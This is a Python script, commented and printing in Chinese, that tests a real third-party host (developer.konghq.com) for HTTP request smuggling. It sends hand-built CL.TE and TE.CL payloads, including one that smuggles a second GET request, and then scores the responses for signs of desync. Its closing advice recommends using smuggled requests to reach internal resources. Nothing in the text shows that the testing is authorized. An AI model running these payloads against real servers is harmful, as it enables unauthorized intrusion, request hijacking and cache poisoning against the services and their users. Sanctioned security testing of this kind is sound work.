#!/usr/bin/env python3
"""
HTTP Desync 深度验证
使用更精确的方法验证CL.TE攻击
"""
import socket
import ssl
import time

HOST = 'developer.konghq.com'
PORT = 443

def send_request(payload, label):
    """发送请求并分析响应"""
    print(f"\n{'='*80}")
    print(f"测试: {label}")
    print(f"{'='*80}")
    
    try:
        context = ssl.create_default_context()
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=HOST)
        conn.settimeout(15)
        conn.connect((HOST, PORT))
        
        print(f"[发送Payload]")
        print(payload.replace('\r\n', '\\r\\n\n'))
        
        conn.sendall(payload.encode())
        
        # 等待响应
        start = time.time()
        response = b""
        
        while time.time() - start < 10:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                response += data
                
                # 如果收到完整响应，提前退出
                if b'\r\n\r\n' in response and len(response) > 100:
                    # 检查是否是完整的HTTP响应
                    header_end = response.find(b'\r\n\r\n')
                    headers = response[:header_end].decode('utf-8', errors='ignore')
                    
                    # 如果有Content-Length，检查是否接收完整
                    if 'Content-Length:' in headers:
                        import re
                        match = re.search(r'Content-Length:\s*(\d+)', headers)
                        if match:
                            content_length = int(match.group(1))
                            body_start = header_end + 4
                            body_received = len(response) - body_start
                            if body_received >= content_length:
                                break
                    else:
                        # 没有Content-Length，等待一下看是否有更多数据
                        time.sleep(1)
                        break
                        
            except socket.timeout:
                print("\n⏱️  超时（可能正在等待更多数据）")
                break
        
        elapsed = time.time() - start
        conn.close()
        
        print(f"\n[响应信息]")
        print(f"  总长度: {len(response)} bytes")
        print(f"  耗时: {elapsed:.2f}秒")
        
        if response:
            # 解析响应头
            try:
                header_end = response.find(b'\r\n\r\n')
                if header_end != -1:
                    headers = response[:header_end].decode('utf-8', errors='ignore')
                    body = response[header_end+4:]
                    
                    print(f"\n[响应头]")
                    for line in headers.split('\r\n'):
                        print(f"  {line}")
                    
                    print(f"\n[响应体前100字符]")
                    print(f"  {body[:100]}")
                    
                    # 判断是否存在Desync
                    status_line = headers.split('\r\n')[0] if '\r\n' in headers else ''
                    
                    indicators = []
                    
                    # 指标1: 响应时间异常长
                    if elapsed > 5:
                        indicators.append("响应时间过长(>5秒)")
                    
                    # 指标2: 返回408 Request Timeout
                    if b'408' in response[:50]:
                        indicators.append("返回408超时")
                    
                    # 指标3: 返回400 Bad Request
                    if b'400' in response[:50]:
                        indicators.append("返回400错误")
                    
                    # 指标4: 连接被立即关闭
                    if len(response) < 50 and elapsed < 1:
                        indicators.append("连接立即关闭")
                    
                    # 指标5: 响应包含第二个请求的痕迹
                    if b'GPOST' in response or b'ZPOST' in response:
                        indicators.append("响应中包含拼接的请求")
                    
                    if indicators:
                        print(f"\n🔴 可疑指标:")
                        for ind in indicators:
                            print(f"  • {ind}")
                        return True
                    else:
                        print(f"\n✅ 未发现明显的Desync迹象")
                        return False
                        
            except Exception as e:
                print(f"\n❌ 解析响应失败: {e}")
                print(f"原始响应前200字节: {response[:200]}")
        else:
            print("\n❌ 未收到任何响应")
            
    except Exception as e:
        print(f"\n❌ 连接错误: {e}")
    
    return False

def test_cl_te_basic():
    """基础CL.TE测试"""
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )
    
    return send_request(payload, "CL.TE 基础测试")

def test_te_cl_basic():
    """基础TE.CL测试"""
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "Z\r\n"
        "Q"
    )
    
    return send_request(payload, "TE.CL 基础测试")

def test_double_request():
    """双重请求测试 - 验证是否能走私第二个请求"""
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Content-Length: 11\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /test HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "\r\n"
    )
    
    return send_request(payload, "双重请求测试")

if __name__ == '__main__':
    print("="*80)
    print(" HTTP Desync 深度验证")
    print("="*80)
    print(f"\n目标: {HOST}:{PORT}")
    print(f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    results = []
    
    # 执行测试
    result1 = test_cl_te_basic()
    results.append(('CL.TE基础', result1))
    
    result2 = test_te_cl_basic()
    results.append(('TE.CL基础', result2))
    
    result3 = test_double_request()
    results.append(('双重请求', result3))
    
    # 总结
    print("\n" + "="*80)
    print(" 📊 测试总结")
    print("="*80)
    
    suspicious = [r for r in results if r[1]]
    
    print(f"\n总测试: {len(results)}")
    print(f"可疑: {len(suspicious)}")
    
    if suspicious:
        print("\n🔴 以下测试显示可疑行为:")
        for name, _ in suspicious:
            print(f"  • {name}")
        
        print("\n⚠️  建议:")
        print("  1. 使用Burp Suite的HTTP Desync Scanner进行自动化测试")
        print("  2. 手动构造更复杂的payload")
        print("  3. 测试不同的路径和参数")
        print("  4. 尝试利用走私的请求访问内部资源")
    else:
        print("\n✅ 所有测试均正常")
        print("\n说明:")
        print("  • CloudFront CDN可能有防护机制")
        print("  • 前端和后端对HTTP解析一致")
        print("  • 不太可能存在HTTP Desync漏洞")
